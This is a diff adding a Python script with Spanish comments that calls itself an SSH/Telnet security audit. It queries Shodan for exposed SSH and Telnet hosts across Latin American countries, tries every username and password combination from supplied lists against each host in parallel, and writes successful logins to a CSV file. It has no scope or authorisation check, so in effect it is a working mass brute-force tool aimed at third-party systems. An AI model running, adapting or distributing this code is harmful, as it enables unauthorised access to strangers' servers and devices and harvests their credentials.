@@ -1,0 +1,699 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+"""
+Script de Auditoría de Seguridad para SSH y Telnet
+--------------------------------------------------
+Este script identifica y valida servicios SSH y Telnet expuestos en países de 
+Latinoamérica utilizando la API de Shodan, y verifica la seguridad de estos 
+servicios mediante intentos de autenticación con listas de credenciales.
+
+Autor: [Tu Nombre]
+Versión: 1.0
+Fecha: 12/04/2025
+"""
+
+import os
+import sys
+import time
+import socket
+import logging
+import argparse
+import ipaddress
+import threading
+import concurrent.futures
+from datetime import datetime
+from typing import List, Dict, Tuple, Set, Optional, Union
+
+# Módulos para servicios
+import paramiko
+import telnetlib
+import shodan
+
+# Configuración de logging
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    handlers=[
+        logging.FileHandler("security_audit.log"),
+        logging.StreamHandler()
+    ]
+)
+logger = logging.getLogger("SecurityAudit")
+
+# Países de Latinoamérica para filtrar búsquedas en Shodan
+LATAM_COUNTRIES = [
+    "AR", "BO", "BR", "CL", "CO", "CR", "CU", "DO", "EC", 
+    "SV", "GT", "HT", "HN", "MX", "NI", "PA", "PY", "PE", 
+    "PR", "UY", "VE"
+]
+
+class CredentialTester:
+    """Clase para probar credenciales en servicios SSH y Telnet."""
+    
+    def __init__(self, ip_file: str, user_file: str, pass_file: str, 
+                 threads: int = 10, timeout: int = 5):
+        """
+        Inicializar el probador de credenciales.
+        
+        Args:
+            ip_file: Ruta al archivo con IPs
+            user_file: Ruta al archivo con nombres de usuario
+            pass_file: Ruta al archivo con contraseñas
+            threads: Número de hilos para ejecución concurrente
+            timeout: Tiempo de espera para conexiones en segundos
+        """
+        self.ip_file = ip_file
+        self.user_file = user_file
+        self.pass_file = pass_file
+        self.threads = threads
+        self.timeout = timeout
+        self.valid_credentials = []
+        self.lock = threading.Lock()
+        self.stats = {
+            "total_ips": 0,
+            "accessible_ssh": 0,
+            "accessible_telnet": 0,
+            "successful_auth": 0,
+            "failed_auth": 0,
+            "connection_errors": 0
+        }
+        
+    def load_file(self, file_path: str) -> List[str]:
+        """
+        Cargar un archivo de texto y devolver sus líneas.
+        
+        Args:
+            file_path: Ruta al archivo a cargar
+            
+        Returns:
+            Lista de líneas del archivo
+        """
+        try:
+            with open(file_path, 'r') as f:
+                return [line.strip() for line in f.readlines() if line.strip()]
+        except Exception as e:
+            logger.error(f"Error cargando archivo {file_path}: {str(e)}")
+            return []
+    
+    def test_ssh_connection(self, ip: str, port: int = 22) -> bool:
+        """
+        Verificar si un puerto SSH está abierto.
+        
+        Args:
+            ip: Dirección IP a probar
+            port: Puerto SSH (por defecto 22)
+            
+        Returns:
+            True si el puerto está abierto, False en caso contrario
+        """
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            return result == 0
+        except Exception as e:
+            logger.debug(f"Error verificando SSH en {ip}:{port} - {str(e)}")
+            return False
+    
+    def test_telnet_connection(self, ip: str, port: int = 23) -> bool:
+        """
+        Verificar si un puerto Telnet está abierto.
+        
+        Args:
+            ip: Dirección IP a probar
+            port: Puerto Telnet (por defecto 23)
+            
+        Returns:
+            True si el puerto está abierto, False en caso contrario
+        """
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(self.timeout)
+            result = sock.connect_ex((ip, port))
+            sock.close()
+            return result == 0
+        except Exception as e:
+            logger.debug(f"Error verificando Telnet en {ip}:{port} - {str(e)}")
+            return False
+    
+    def try_ssh_login(self, ip: str, username: str, password: str, port: int = 22) -> bool:
+        """
+        Intentar iniciar sesión SSH con credenciales dadas.
+        
+        Args:
+            ip: Dirección IP del servidor SSH
+            username: Nombre de usuario
+            password: Contraseña
+            port: Puerto SSH (por defecto 22)
+            
+        Returns:
+            True si la autenticación fue exitosa, False en caso contrario
+        """
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
+        try:
+            client.connect(
+                ip, 
+                port=port, 
+                username=username, 
+                password=password,
+                timeout=self.timeout,
+                allow_agent=False,
+                look_for_keys=False
+            )
+            
+            with self.lock:
+                self.valid_credentials.append({
+                    "ip": ip,
+                    "port": port,
+                    "service": "SSH",
+                    "username": username,
+                    "password": password,
+                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                })
+                self.stats["successful_auth"] += 1
+                
+            client.close()
+            return True
+            
+        except paramiko.AuthenticationException:
+            with self.lock:
+                self.stats["failed_auth"] += 1
+            return False
+            
+        except (socket.error, paramiko.SSHException) as e:
+            with self.lock:
+                self.stats["connection_errors"] += 1
+            logger.debug(f"Error SSH en {ip}:{port} - {str(e)}")
+            return False
+            
+        finally:
+            client.close()
+    
+    def try_telnet_login(self, ip: str, username: str, password: str, port: int = 23) -> bool:
+        """
+        Intentar iniciar sesión Telnet con credenciales dadas.
+        
+        Args:
+            ip: Dirección IP del servidor Telnet
+            username: Nombre de usuario
+            password: Contraseña
+            port: Puerto Telnet (por defecto 23)
+            
+        Returns:
+            True si la autenticación fue exitosa, False en caso contrario
+        """
+        try:
+            tn = telnetlib.Telnet(ip, port, self.timeout)
+            
+            # Esperar prompt de login o password directamente
+            login_prompt = tn.read_until(b"login:", self.timeout)
+            if b"login:" in login_prompt:
+                tn.write(username.encode('ascii') + b"\n")
+                password_prompt = tn.read_until(b"Password:", self.timeout)
+                tn.write(password.encode('ascii') + b"\n")
+            else:
+                # Algunos sistemas Telnet solicitan la contraseña directamente
+                tn.write(password.encode('ascii') + b"\n")
+            
+            # Leer respuesta
+            response = tn.read_until(b"$", self.timeout)
+            
+            # Verificar si hay indicios de inicio de sesión exitoso
+            if b"$" in response or b"#" in response or b">" in response:
+                with self.lock:
+                    self.valid_credentials.append({
+                        "ip": ip,
+                        "port": port,
+                        "service": "Telnet",
+                        "username": username,
+                        "password": password,
+                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                    })
+                    self.stats["successful_auth"] += 1
+                tn.close()
+                return True
+            
+            with self.lock:
+                self.stats["failed_auth"] += 1
+            tn.close()
+            return False
+            
+        except (socket.error, EOFError, ConnectionError) as e:
+            with self.lock:
+                self.stats["connection_errors"] += 1
+            logger.debug(f"Error Telnet en {ip}:{port} - {str(e)}")
+            return False
+    
+    def process_target(self, ip: str, service: str, port: int):
+        """
+        Procesar un objetivo específico probando todas las credenciales.
+        
+        Args:
+            ip: Dirección IP objetivo
+            service: Servicio a probar ('ssh' o 'telnet')
+            port: Puerto del servicio
+        """
+        users = self.load_file(self.user_file)
+        passwords = self.load_file(self.pass_file)
+        
+        # Verificar si el puerto está abierto primero
+        is_open = False
+        if service.lower() == 'ssh':
+            is_open = self.test_ssh_connection(ip, port)
+            if is_open:
+                with self.lock:
+                    self.stats["accessible_ssh"] += 1
+        else:  # Telnet
+            is_open = self.test_telnet_connection(ip, port)
+            if is_open:
+                with self.lock:
+                    self.stats["accessible_telnet"] += 1
+        
+        if not is_open:
+            logger.debug(f"Puerto {port} cerrado en {ip} para {service}")
+            return
+        
+        logger.info(f"Probando credenciales para {service} en {ip}:{port}")
+        
+        # Probar cada combinación de usuario/contraseña
+        for user in users:
+            for password in passwords:
+                if service.lower() == 'ssh':
+                    if self.try_ssh_login(ip, user, password, port):
+                        logger.info(f"Credenciales SSH válidas encontradas - {ip}:{port} - {user}:{password}")
+                        # Si encontramos credenciales válidas, podemos pasar al siguiente objetivo
+                        return
+                else:  # Telnet
+                    if self.try_telnet_login(ip, user, password, port):
+                        logger.info(f"Credenciales Telnet válidas encontradas - {ip}:{port} - {user}:{password}")
+                        # Si encontramos credenciales válidas, podemos pasar al siguiente objetivo
+                        return
+    
+    def run(self):
+        """Ejecutar las pruebas de credenciales en todos los objetivos."""
+        ips = self.load_file(self.ip_file)
+        if not ips:
+            logger.error(f"No se pudieron cargar IPs desde {self.ip_file}")
+            return
+        
+        logger.info(f"Cargadas {len(ips)} IPs para verificación")
+        self.stats["total_ips"] = len(ips)
+        
+        # Crear lista de tareas
+        tasks = []
+        for ip in ips:
+            # Agregar tareas para SSH (puerto 22)
+            tasks.append((ip, 'ssh', 22))
+            
+            # Agregar tareas para Telnet (puerto 23)
+            tasks.append((ip, 'telnet', 23))
+        
+        # Ejecutar tareas en paralelo
+        with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = {executor.submit(self.process_target, ip, service, port): (ip, service, port) 
+                      for ip, service, port in tasks}
+            
+            for future in concurrent.futures.as_completed(futures):
+                ip, service, port = futures[future]
+                try:
+                    future.result()
+                except Exception as e:
+                    logger.error(f"Error procesando {ip}:{port} ({service}): {str(e)}")
+        
+        # Guardar resultados de credenciales válidas
+        self.save_valid_credentials()
+        
+        # Mostrar estadísticas
+        self.print_stats()
+    
+    def save_valid_credentials(self):
+        """Guardar las credenciales válidas en un archivo CSV."""
+        if not self.valid_credentials:
+            logger.info("No se encontraron credenciales válidas")
+            return
+        
+        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+        filename = f"valid_credentials_{timestamp}.csv"
+        
+        try:
+            with open(filename, 'w') as f:
+                f.write("IP,Puerto,Servicio,Usuario,Contraseña,Fecha\n")
+                for cred in self.valid_credentials:
+                    f.write(f"{cred['ip']},{cred['port']},{cred['service']},{cred['username']},{cred['password']},{cred['timestamp']}\n")
+            
+            logger.info(f"Credenciales válidas guardadas en {filename}")
+        except Exception as e:
+            logger.error(f"Error guardando credenciales: {str(e)}")
+    
+    def print_stats(self):
+        """Mostrar estadísticas de la auditoría."""
+        logger.info("=" * 50)
+        logger.info("ESTADÍSTICAS DE AUDITORÍA")
+        logger.info("=" * 50)
+        logger.info(f"Total de IPs verificadas: {self.stats['total_ips']}")
+        
+        ssh_percent = 0
+        if self.stats['total_ips'] > 0:
+            ssh_percent = (self.stats['accessible_ssh'] / self.stats['total_ips']) * 100
+        
+        telnet_percent = 0
+        if self.stats['total_ips'] > 0:
+            telnet_percent = (self.stats['accessible_telnet'] / self.stats['total_ips']) * 100
+        
+        logger.info(f"IPs con SSH accesible: {self.stats['accessible_ssh']} ({ssh_percent:.2f}%)")
+        logger.info(f"IPs con Telnet accesible: {self.stats['accessible_telnet']} ({telnet_percent:.2f}%)")
+        logger.info(f"Autenticaciones exitosas: {self.stats['successful_auth']}")
+        logger.info(f"Autenticaciones fallidas: {self.stats['failed_auth']}")
+        logger.info(f"Errores de conexión: {self.stats['connection_errors']}")
+        logger.info("=" * 50)
+
+
+class ShodanScanner:
+    """Clase para escanear servicios usando la API de Shodan."""
+    
+    def __init__(self, api_key: str, output_file: str = "shodan_results.txt"):
+        """
+        Inicializar el escáner de Shodan.
+        
+        Args:
+            api_key: Clave de API de Shodan
+            output_file: Archivo de salida para los resultados
+        """
+        self.api_key = api_key
+        self.output_file = output_file
+        self.results = []
+        
+        try:
+            self.api = shodan.Shodan(api_key)
+            logger.info("API de Shodan inicializada correctamente")
+        except Exception as e:
+            logger.error(f"Error al inicializar la API de Shodan: {str(e)}")
+            self.api = None
+    
+    def search_ssh(self, countries: List[str] = None, limit: int = 100) -> List[Dict]:
+        """
+        Buscar servicios SSH en Shodan.
+        
+        Args:
+            countries: Lista de códigos de país para filtrar
+            limit: Límite de resultados
+            
+        Returns:
+            Lista de resultados de SSH
+        """
+        if self.api is None:
+            logger.error("API de Shodan no inicializada")
+            return []
+        
+        results = []
+        country_filter = ""
+        
+        if countries:
+            country_filter = " ".join([f"country:{c}" for c in countries])
+        
+        query = f"port:22 {country_filter}"
+        logger.info(f"Realizando búsqueda en Shodan: {query}")
+        
+        try:
+            search_results = self.api.search(query, limit=limit)
+            logger.info(f"Resultados encontrados: {search_results['total']}")
+            
+            for result in search_results['matches']:
+                ip = result.get('ip_str')
+                if ip:
+                    port = result.get('port', 22)
+                    country = result.get('location', {}).get('country_code', 'Unknown')
+                    
+                    results.append({
+                        'ip': ip,
+                        'port': port,
+                        'service': 'SSH',
+                        'country': country
+                    })
+            
+            return results
+            
+        except shodan.APIError as e:
+            logger.error(f"Error de API Shodan al buscar SSH: {str(e)}")
+            return []
+    
+    def search_telnet(self, countries: List[str] = None, limit: int = 100) -> List[Dict]:
+        """
+        Buscar servicios Telnet en Shodan.
+        
+        Args:
+            countries: Lista de códigos de país para filtrar
+            limit: Límite de resultados
+            
+        Returns:
+            Lista de resultados de Telnet
+        """
+        if self.api is None:
+            logger.error("API de Shodan no inicializada")
+            return []
+        
+        results = []
+        country_filter = ""
+        
+        if countries:
+            country_filter = " ".join([f"country:{c}" for c in countries])
+        
+        query = f"port:23 {country_filter}"
+        logger.info(f"Realizando búsqueda en Shodan: {query}")
+        
+        try:
+            search_results = self.api.search(query, limit=limit)
+            logger.info(f"Resultados encontrados: {search_results['total']}")
+            
+            for result in search_results['matches']:
+                ip = result.get('ip_str')
+                if ip:
+                    port = result.get('port', 23)
+                    country = result.get('location', {}).get('country_code', 'Unknown')
+                    
+                    results.append({
+                        'ip': ip,
+                        'port': port,
+                        'service': 'Telnet',
+                        'country': country
+                    })
+            
+            return results
+            
+        except shodan.APIError as e:
+            logger.error(f"Error de API Shodan al buscar Telnet: {str(e)}")
+            return []
+    
+    def search_alternative_ports(self, service: str, countries: List[str] = None, limit: int = 100) -> List[Dict]:
+        """
+        Buscar servicios en puertos no estándar.
+        
+        Args:
+            service: Servicio a buscar ('ssh' o 'telnet')
+            countries: Lista de códigos de país para filtrar
+            limit: Límite de resultados
+            
+        Returns:
+            Lista de resultados
+        """
+        if self.api is None:
+            logger.error("API de Shodan no inicializada")
+            return []
+        
+        results = []
+        country_filter = ""
+        
+        if countries:
+            country_filter = " ".join([f"country:{c}" for c in countries])
+        
+        # Buscar por producto/servicio en lugar de puerto
+        if service.lower() == 'ssh':
+            query = f"product:openssh -port:22 {country_filter}"
+        else:  # telnet
+            query = f"product:telnetd -port:23 {country_filter}"
+        
+        logger.info(f"Realizando búsqueda de puertos alternativos en Shodan: {query}")
+        
+        try:
+            search_results = self.api.search(query, limit=limit)
+            logger.info(f"Resultados de puertos alternativos encontrados: {search_results['total']}")
+            
+            for result in search_results['matches']:
+                ip = result.get('ip_str')
+                if ip:
+                    port = result.get('port', 0)
+                    country = result.get('location', {}).get('country_code', 'Unknown')
+                    
+                    results.append({
+                        'ip': ip,
+                        'port': port,
+                        'service': service.upper(),
+                        'country': country
+                    })
+            
+            return results
+            
+        except shodan.APIError as e:
+            logger.error(f"Error de API Shodan al buscar puertos alternativos: {str(e)}")
+            return []
+    
+    def run_all_searches(self, countries: List[str] = None, limit: int = 100):
+        """
+        Ejecutar todas las búsquedas y guardar resultados.
+        
+        Args:
+            countries: Lista de códigos de país para filtrar
+            limit: Límite de resultados por búsqueda
+        """
+        all_results = []
+        
+        # Búsqueda SSH estándar
+        ssh_results = self.search_ssh(countries, limit)
+        all_results.extend(ssh_results)
+        logger.info(f"Encontrados {len(ssh_results)} servicios SSH en puertos estándar")
+        
+        # Búsqueda Telnet estándar
+        telnet_results = self.search_telnet(countries, limit)
+        all_results.extend(telnet_results)
+        logger.info(f"Encontrados {len(telnet_results)} servicios Telnet en puertos estándar")
+        
+        # Búsqueda SSH en puertos alternativos
+        alt_ssh_results = self.search_alternative_ports('ssh', countries, limit)
+        all_results.extend(alt_ssh_results)
+        logger.info(f"Encontrados {len(alt_ssh_results)} servicios SSH en puertos alternativos")
+        
+        # Búsqueda Telnet en puertos alternativos
+        alt_telnet_results = self.search_alternative_ports('telnet', countries, limit)
+        all_results.extend(alt_telnet_results)
+        logger.info(f"Encontrados {len(alt_telnet_results)} servicios Telnet en puertos alternativos")
+        
+        # Guardar resultados
+        self.results = all_results
+        self.save_results()
+        
+        return all_results
+    
+    def save_results(self):
+        """Guardar los resultados en un archivo."""
+        if not self.results:
+            logger.info("No hay resultados para guardar")
+            return
+        
+        try:
+            with open(self.output_file, 'w') as f:
+                for result in self.results:
+                    f.write(f"{result['ip']}\n")
+            
+            logger.info(f"Resultados guardados en {self.output_file}")
+            
+            # Guardar información detallada en formato CSV
+            csv_file = f"{os.path.splitext(self.output_file)[0]}_detailed.csv"
+            with open(csv_file, 'w') as f:
+                f.write("IP,Puerto,Servicio,País\n")
+                for result in self.results:
+                    f.write(f"{result['ip']},{result['port']},{result['service']},{result['country']}\n")
+            
+            logger.info(f"Información detallada guardada en {csv_file}")
+            
+        except Exception as e:
+            logger.error(f"Error al guardar resultados: {str(e)}")
+
+
+def parse_arguments():
+    """
+    Parsear argumentos de línea de comandos.
+    
+    Returns:
+        Argumentos parseados
+    """
+    parser = argparse.ArgumentParser(
+        description="""
+        Script de Auditoría de Seguridad SSH/Telnet - Identifica y valida
+        servicios SSH y Telnet expuestos en países de Latinoamérica.
+        """,
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    
+    # Modos de operación
+    mode_group = parser.add_argument_group('Modos de operación')
+    mode_group.add_argument('--shodan', action='store_true', 
+                           help='Ejecutar búsqueda con Shodan API')
+    mode_group.add_argument('--test', action='store_true',
+                           help='Probar credenciales en IPs')
+    
+    # Opciones Shodan
+    shodan_group = parser.add_argument_group('Opciones Shodan')
+    shodan_group.add_argument('--api-key', type=str,
+                             help='Clave de API de Shodan')
+    shodan_group.add_argument('--output', type=str, default='shodan_results.txt',
+                             help='Archivo para guardar resultados de Shodan')
+    shodan_group.add_argument('--limit', type=int, default=100,
+                             help='Límite de resultados por búsqueda (default: 100)')
+    
+    # Opciones de prueba de credenciales
+    test_group = parser.add_argument_group('Prueba de credenciales')
+    test_group.add_argument('--ip-file', type=str,
+                           help='Archivo con lista de IPs')
+    test_group.add_argument('--user-file', type=str,
+                           help='Archivo con lista de usuarios')
+    test_group.add_argument('--pass-file', type=str,
+                           help='Archivo con lista de contraseñas')
+    test_group.add_argument('--threads', type=int, default=10,
+                           help='Número de hilos (default: 10)')
+    test_group.add_argument('--timeout', type=int, default=5,
+                           help='Tiempo de espera en segundos (default: 5)')
+    
+    return parser.parse_args()
+
+
+def main():
+    """Función principal del script."""
+    args = parse_arguments()
+    
+    print("""
+    ╔═══════════════════════════════════════════════════╗
+    ║         AUDITORÍA DE SEGURIDAD SSH/TELNET         ║
+    ╚═══════════════════════════════════════════════════╝
+    """)
+    
+    if not args.shodan and not args.test:
+        logger.error("Debe especificar al menos un modo de operación (--shodan o --test)")
+        return
+    
+    # Modo Shodan
+    if args.shodan:
+        if not args.api_key:
+            logger.error("Se requiere una clave de API de Shodan (--api-key)")
+            return
+        
+        scanner = ShodanScanner(args.api_key, args.output)
+        scanner.run_all_searches(countries=LATAM_COUNTRIES, limit=args.limit)
+    
+    # Modo prueba de credenciales
+    if args.test:
+        if not all([args.ip_file, args.user_file, args.pass_file]):
+            logger.error("Se requieren archivos de IPs, usuarios y contraseñas")
+            return
+        
+        tester = CredentialTester(
+            args.ip_file,
+            args.user_file,
+            args.pass_file,
+            args.threads,
+            args.timeout
+        )
+        tester.run()
+    
+    print("""
+    ╔═══════════════════════════════════════════════════╗
+    ║              AUDITORÍA COMPLETADA                 ║
+    ╚═══════════════════════════════════════════════════╝
+    """)
+
+
+if __name__ == "__main__":
+    main()
